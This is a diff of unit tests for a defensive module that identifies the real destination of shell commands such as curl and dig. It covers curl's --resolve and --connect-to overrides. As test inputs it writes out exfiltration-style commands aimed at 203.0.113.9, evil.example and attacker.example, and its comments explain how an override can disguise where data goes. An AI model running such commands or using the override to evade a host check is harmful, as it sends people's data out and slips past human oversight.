@@ -255,6 +255,57 @@ describe('where a shell command would send data', () => {
    * through the resolver before anything answers, and it needs no listening service to succeed.
    * None of these writes an address the way a URL is written, and every one of them is an address.
    */
+  /*
+   * The option that names one host and opens the socket at another.
+   *
+   * `--resolve host:port:address` tells curl to skip the resolver, so every other argument goes on
+   * naming a host that never receives anything. Before this, the value was read by the same reader
+   * that reads a bare `host:port`, which destructures two fields out of `split(':')` and silently
+   * discards the third - so a request carrying the owner's data to an address of the attacker's
+   * choosing was charged against a host already read this turn, and raised no card. Worse than an
+   * unreadable address, which now asks: this answered confidently, with the wrong host.
+   */
+  it('names where a connection is actually opened, not the host the rest of the command claims', () => {
+    expect(
+      shell({
+        executable: 'curl',
+        args: ['--resolve', 'docs.example.com:443:203.0.113.9', 'https://docs.example.com/steal']
+      })
+    ).toContain('https://203.0.113.9/');
+    expect(
+      shell({
+        executable: 'curl',
+        args: [
+          '--connect-to',
+          'docs.example.com:443:evil.example:443',
+          'https://docs.example.com/x'
+        ]
+      })
+    ).toContain('https://evil.example/');
+  });
+
+  it('asks about an override it cannot read rather than falling back to the host beside it', () => {
+    // `$IP` is resolved by the shell, not by this reader, and an override that cannot be read is a
+    // stronger reason to ask than one that can.
+    expect(
+      shell({
+        executable: 'curl',
+        args: ['--resolve', 'docs.example.com:443:$IP', 'https://docs.example.com/x']
+      })
+    ).toContain('docs.example.com:443:$IP');
+  });
+
+  it('lets curl remove an override without that looking like one', () => {
+    // `--resolve -host:port` deletes an earlier override and names no far end, so the ordinary
+    // address is the whole truth and a card here would be a card on ordinary work.
+    expect(
+      shell({
+        executable: 'curl',
+        args: ['--resolve', '-docs.example.com:443', 'https://docs.example.com/x']
+      })
+    ).toEqual(['https://docs.example.com/x']);
+  });
+
   it('reads an address that was written as an argument rather than as a URL', () => {
     expect(shell({ executable: 'dig', args: ['+short', 'PAYLOAD.attacker.example'] })).toEqual([
       'https://payload.attacker.example/'
